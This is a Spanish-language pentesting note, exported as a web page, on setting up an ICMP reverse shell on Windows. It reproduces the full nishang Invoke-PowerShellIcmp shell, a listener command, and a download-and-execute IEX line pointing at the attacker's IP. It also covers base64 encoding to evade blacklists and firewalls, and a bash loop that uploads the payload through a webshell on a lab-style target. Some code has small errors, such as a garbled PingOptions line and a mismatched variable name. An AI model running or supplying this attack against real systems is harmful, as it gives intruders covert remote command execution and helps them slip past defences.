<!DOCTYPE html> <html><head>
		<title>ICMP Reverse Shell (PowerShell)</title>
		<base href="..\..\..\..\..\..\..\..\../">
		<meta id="root-path" root-path="..\..\..\..\..\..\..\..\../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="Hacking - ICMP Reverse Shell (PowerShell)">
		<meta property="og:title" content="ICMP Reverse Shell (PowerShell)">
		<meta property="og:description" content="Hacking - ICMP Reverse Shell (PowerShell)">
		<meta property="og:type" content="website">
		<meta property="og:url" content="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/windows/icmp-reverse-shell-(powershell).html">
		<meta property="og:image" content="undefined">
		<meta property="og:site_name" content="Hacking">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="ICMP Reverse Shell (PowerShell)"><p>ICMP Reverse Shell (PowerShell)</p></h1><div><hr></div><div><ul>
<li data-line="0">Tags: <a href="?query=tag:teoria" class="tag" target="_blank" rel="noopener">#teoria</a> <a href="?query=tag:practica" class="tag" target="_blank" rel="noopener">#practica</a> <a href="?query=tag:explotaci%C3%B3n" class="tag" target="_blank" rel="noopener">#explotación</a></li>
</ul></div><div><hr></div><div class="heading-wrapper"><h1 data-heading="ICMP" class="heading" id="ICMP">ICMP</h1><div class="heading-children"><div><p>El <strong>Internet Control Message Protocolo</strong> es parte del conjunto de protocolos IP. Es utilizado para enviar mensjes de error e información operativa indicando, por ejemplo, que un host no puede ser localizado o que un servicio se ha solicitao no está disponible.</p></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="Abuso" class="heading" id="Abuso">Abuso</h1><div class="heading-children"><div><p>La técnica <strong>ICMP Reverse Shell</strong> es utilizada para establecer una conexión inversa a través del protocolo ICMP desede una máquina comprometida a una máquina atacante. Esta técnica puede ser utilizada para evadir detecciones de seguridad y firewalls, ya que el tráfico ICMP a menudo se permite en muchas redes.</p></div><div><p>En este caso, podríamos usar el repositorio de <a data-tooltip-position="top" aria-label="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1" rel="noopener" class="external-link" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1" target="_blank">nishang</a> en donde se comparten scripts como <strong>PowerShellIcmp.ps1</strong>.</p></div><div><pre class="language-powershell" tabindex="0"><code class="language-powershell is-loaded"><span class="token keyword">function</span> <span class="token function">Invoke-PowerShellIcmp</span>
<span class="token punctuation">{</span>        
    <span class="token namespace">[CmdletBinding()]</span> <span class="token keyword">Param</span><span class="token punctuation">(</span>

        <span class="token namespace">[Parameter(Position = 0, Mandatory = $true)]</span>
        <span class="token namespace">[String]</span>
        <span class="token variable">$IPAddress</span><span class="token punctuation">,</span>

        <span class="token namespace">[Parameter(Position = 1, Mandatory = $false)]</span>
        <span class="token namespace">[Int]</span>
        <span class="token variable">$Delay</span> = 5<span class="token punctuation">,</span>

        <span class="token namespace">[Parameter(Position = 2, Mandatory = $false)]</span>
        <span class="token namespace">[Int]</span>
        <span class="token variable">$BufferSize</span> = 128

    <span class="token punctuation">)</span>

    <span class="token variable">$ICMPClient</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>NetworkInformation<span class="token punctuation">.</span>Ping
    <span class="token variable">$PingOptions</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>NetworkInformation<span class="token punctuation">.</span>PingOptionsInvoke-PowerShellIcmp
    <span class="token variable">$PingOptions</span><span class="token punctuation">.</span>DontFragment = <span class="token boolean">$True</span>

    <span class="token variable">$sendbytes</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token string">"Windows PowerShell running as user "</span> <span class="token operator">+</span> <span class="token variable">$env</span>:username <span class="token operator">+</span> <span class="token string">" on "</span> <span class="token operator">+</span> <span class="token variable">$env</span>:computername <span class="token operator">+</span> <span class="token string">"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n"</span><span class="token punctuation">)</span>
    <span class="token variable">$ICMPClient</span><span class="token punctuation">.</span>Send<span class="token punctuation">(</span><span class="token variable">$IPAddress</span><span class="token punctuation">,</span>60 <span class="token operator">*</span> 1000<span class="token punctuation">,</span> <span class="token variable">$sendbytes</span><span class="token punctuation">,</span> <span class="token variable">$PingOptions</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>

    <span class="token variable">$sendbytes</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token string">'PS '</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">Get-Location</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Path <span class="token operator">+</span> <span class="token string">'&gt; '</span><span class="token punctuation">)</span>
    <span class="token variable">$ICMPClient</span><span class="token punctuation">.</span>Send<span class="token punctuation">(</span><span class="token variable">$IPAddress</span><span class="token punctuation">,</span>60 <span class="token operator">*</span> 1000<span class="token punctuation">,</span> <span class="token variable">$sendbytes</span><span class="token punctuation">,</span> <span class="token variable">$PingOptions</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">$true</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$sendbytes</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        <span class="token variable">$reply</span> = <span class="token variable">$ICMPClient</span><span class="token punctuation">.</span>Send<span class="token punctuation">(</span><span class="token variable">$IPAddress</span><span class="token punctuation">,</span>60 <span class="token operator">*</span> 1000<span class="token punctuation">,</span> <span class="token variable">$sendbytes</span><span class="token punctuation">,</span> <span class="token variable">$PingOptions</span><span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$reply</span><span class="token punctuation">.</span>Buffer<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$response</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$reply</span><span class="token punctuation">.</span>Buffer<span class="token punctuation">)</span>
            <span class="token variable">$result</span> = <span class="token punctuation">(</span><span class="token function">Invoke-Expression</span> <span class="token operator">-</span>Command <span class="token variable">$response</span> 2&gt;&amp;1 <span class="token punctuation">|</span> <span class="token function">Out-String</span> <span class="token punctuation">)</span>
            <span class="token variable">$sendbytes</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span>
            <span class="token variable">$index</span> = <span class="token namespace">[math]</span>::floor<span class="token punctuation">(</span><span class="token variable">$sendbytes</span><span class="token punctuation">.</span>length/<span class="token variable">$BufferSize</span><span class="token punctuation">)</span>
            <span class="token variable">$i</span> = 0

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$sendbytes</span><span class="token punctuation">.</span>length <span class="token operator">-gt</span> <span class="token variable">$BufferSize</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">-lt</span> <span class="token variable">$index</span> <span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$sendbytes2</span> = <span class="token variable">$sendbytes</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">*</span><span class="token variable">$BufferSize</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">+</span>1<span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$BufferSize</span><span class="token operator">-</span>1<span class="token punctuation">)</span><span class="token punctuation">]</span>
                    <span class="token variable">$ICMPClient</span><span class="token punctuation">.</span>Send<span class="token punctuation">(</span><span class="token variable">$IPAddress</span><span class="token punctuation">,</span>60 <span class="token operator">*</span> 10000<span class="token punctuation">,</span> <span class="token variable">$sendbytes2</span><span class="token punctuation">,</span> <span class="token variable">$PingOptions</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
                    <span class="token variable">$i</span> <span class="token operator">+=</span>1
                <span class="token punctuation">}</span>
                <span class="token variable">$remainingindex</span> = <span class="token variable">$sendbytes</span><span class="token punctuation">.</span>Length <span class="token operator">%</span> <span class="token variable">$BufferSize</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$remainingindex</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$sendbytes2</span> = <span class="token variable">$sendbytes</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">*</span><span class="token variable">$BufferSize</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token variable">$sendbytes</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">]</span>
                    <span class="token variable">$ICMPClient</span><span class="token punctuation">.</span>Send<span class="token punctuation">(</span><span class="token variable">$IPAddress</span><span class="token punctuation">,</span>60 <span class="token operator">*</span> 10000<span class="token punctuation">,</span> <span class="token variable">$sendbytes2</span><span class="token punctuation">,</span> <span class="token variable">$PingOptions</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$ICMPClient</span><span class="token punctuation">.</span>Send<span class="token punctuation">(</span><span class="token variable">$IPAddress</span><span class="token punctuation">,</span>60 <span class="token operator">*</span> 10000<span class="token punctuation">,</span> <span class="token variable">$sendbytes</span><span class="token punctuation">,</span> <span class="token variable">$PingOptions</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$sendbytes</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token string">"`nPS "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">Get-Location</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Path <span class="token operator">+</span> <span class="token string">'&gt; '</span><span class="token punctuation">)</span>
            <span class="token variable">$ICMPClient</span><span class="token punctuation">.</span>Send<span class="token punctuation">(</span><span class="token variable">$IPAddress</span><span class="token punctuation">,</span>60 <span class="token operator">*</span> 1000<span class="token punctuation">,</span> <span class="token variable">$sendbytes</span><span class="token punctuation">,</span> <span class="token variable">$PingOptions</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token function">Start-Sleep</span> <span class="token operator">-</span>Seconds <span class="token variable">$Delay</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>De este script podríamos eliminar todos los comentarios e invocar el mismo al final, agregando la línea <code>Invoke-PowerShellIcmp -IPAddress {our_ip}</code>. Puede ser interesante de cara a evitar posibles <strong>black_lists</strong> o <strong>configuraciones de firewall</strong> cambiar el nombre a la función.</p></div><div><p>Una vez descargado el script, deberiamos ejecutar dos procesos específicos.</p></div><div><p><strong>1.</strong> Configurar el sistema para que ignore todas las solicitudes de eco ICMP entrantes, lo que es equivalente a desactivar la respuesta a los pings. Esto puede utilizarse como una medida de seguridad para evitar que otros equipos realicen ping al sistema.</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token function">sudo</span> sysctl -w net.ipv4.icmp_echo_ignore_all<span class="token operator">=</span><span class="token number">1</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p><strong>2.</strong> Descargar el script <a data-tooltip-position="top" aria-label="https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py" rel="noopener" class="external-link" href="https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py" target="_blank">icmpsh_m.py</a> y ejecutarlo con las indicaciones dadas. El mismo implementa el shell inverso a través del protocolo ICMP.</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token function">sudo</span> python icmpsh_m.py <span class="token punctuation">{</span>our_ip<span class="token punctuation">}</span> <span class="token punctuation">{</span>target_ip<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>En caso de que no podamos subir a la máquina víctima el mismo con   <code>IEX(New-Object Net.WebClient).downloadString('hgttp://{our_ip}/icmp_PowerShellIcmp.ps1')</code> podríamos intentar aplicar el concepto de <code>echo 'line to add' &gt; C:\Temp\file</code> para línea por línea intentar cargar este script en un path determinado del sistema. </p></div><div><p>Para realizar esto es importante quitar todos los saltos de línea del script.</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token function">cat</span> PowerShellIcmp.ps1 <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^\s*$/d'</span> <span class="token operator">|</span> sponge PowerShellIcmp.ps1
<span class="token comment"># El \s es equivalente al espacio, por lo que se indica eliminar todo lo que empiece (^) con un espacio (\s) y acabe ($) con nada serán eliminadas (/d)</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Una vez eliminados los espacios, hay que tener en cuenta que los carácteres especiales sean un problema, por lo que es buena idea empezar a pensar en <strong>base64</strong>, aunque PowerShell no lo interpretará de manera correcta debido a los caracteres y el formato de codificación de los archivos de script.</p></div><div><p>Por lo que habría que cambiar con la herramienta <strong>iconv</strong> el formato de codificación del archivo a UTF-16, ya que es la manera en la que powershell espera leerlo.</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token function">cat</span> PowerShellIcmp.ps1 <span class="token operator">|</span> <span class="token function">iconv</span> -t utf-16le <span class="token operator">|</span> base64 -w <span class="token number">0</span><span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token operator">&gt;</span> icmp_base64.ps1
</code><button class="copy-code-button">Copy</button></pre></div><div><p>De esta manera ahora tendríamos en poder un archivo con todo el script a cargar en el sistema víctima en el formato correcto y en base64.</p></div><div><p>Si tuvieramos que subir este archivo a la máquina victima y no tendríamos conectividad por TCP por <strong>Firewalls</strong>, sería importante tener en cuenta que no podríamos hacerlo de una única vez debido a que el comando <strong>curl</strong> o mismo el navegador tienen un limite, por lo que es buena idea emitir este por partes. Para realizar esto podemos hacer uso de la herramienta <strong>fold</strong> (Herramienta utilizada para dar formato y ajustar el ancho de las líneas de un archivo o texto). </p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token function">fold</span> icmp_base64.ps1 <span class="token operator">|</span> sponge icmp_base64.ps1
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Una vez que tengamos el contenido de manerar óptima, quedaría subir el archivo. Por lo que podríamos crearnos un script en bash o python.</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token shebang important">#!/bin/bash</span>

<span class="token keyword">function</span> <span class="token function-name function">ctrl_c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\t">\t</span>[!] Quiting...<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>
	tput cnorm<span class="token punctuation">;</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token punctuation">}</span>

<span class="token builtin class-name">declare</span> -r <span class="token assign-left variable">url</span><span class="token operator">=</span><span class="token string">"http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx"</span>

<span class="token assign-left variable">counter</span><span class="token operator">=</span><span class="token number">0</span>

<span class="token builtin class-name">echo</span><span class="token punctuation">;</span> tput civis<span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token for-or-select variable">line</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> icmp.ps1.b64<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>
	<span class="token assign-left variable">command</span><span class="token operator">=</span><span class="token string">"echo+<span class="token variable">$line</span>+&gt;&gt;+C:\Temp\icmp_cmd.ps1"</span>
	<span class="token builtin class-name">echo</span> -ne <span class="token string">"[+] Line <span class="token variable">$counter</span> sended [<span class="token variable">$counter</span>/87]<span class="token entity" title="\r">\r</span>"</span>
	<span class="token function">curl</span> -s -X GET <span class="token string">"<span class="token variable">$url</span>?xcmd=<span class="token variable">$command</span>"</span> <span class="token operator">&amp;&gt;</span>/dev/null
	<span class="token builtin class-name">let</span> <span class="token assign-left variable">counter</span><span class="token operator">+=</span><span class="token number">1</span>
<span class="token keyword">done</span><span class="token punctuation">;</span> tput cnorm
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Una vez subido el archivo, el problema al cual nos enfrentamos es que tenemos toda la fución de PowerShell en base64, por lo que habría que decodearlo. Para hacer esto podríamos hacer uso de herramientas como <strong>pwsh</strong> las cuales nos brindan un entorno de prueba de PowerShell.</p></div><div><pre class="language-powershell" tabindex="0"><code class="language-powershell is-loaded">powershell <span class="token variable">$functionb64</span> = <span class="token function">Get-Content</span> C:\Temp\icmp_cmd<span class="token punctuation">.</span>ps1
<span class="token comment"># Guardar en la varibale functionb64 el contenido alojado en el archivo C:\Temp\icmp_cmd.ps1</span>

powershell <span class="token variable">$decodeFunction</span> = <span class="token namespace">[System.Text.Encoding]</span>::Unicode<span class="token punctuation">.</span>getString<span class="token punctuation">(</span><span class="token namespace">[System.Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$file64</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># Decodear de base64 el contenido de la función.</span>

powershell <span class="token variable">$decodeFunction</span> &gt; C:\Temp\final_icmp_cmd<span class="token punctuation">.</span>ps1
<span class="token comment"># Guardar la función decodeada en un nuevo archivo C:\Temp\final_icmp_cmd.ps1</span>

powershell <span class="token variable">$functionb64</span> = <span class="token function">Get-Content</span> C:\Temp\icmp_cmd<span class="token punctuation">.</span>ps1<span class="token punctuation">;</span> <span class="token variable">$decodeFunction</span> = <span class="token namespace">[System.Text.Encoding]</span>::Unicode<span class="token punctuation">.</span>getString<span class="token punctuation">(</span><span class="token namespace">[System.Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$file64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$decodeFunction</span> &gt; C:\Temp\final_icmp_cmd<span class="token punctuation">.</span>ps1
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Como último, solo quedaría ejecutar el script final <strong>powershell C:\Temp\final_icmp_cmd.ps1</strong> y recibir la conexión. </p></div><div class="mod-footer"></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
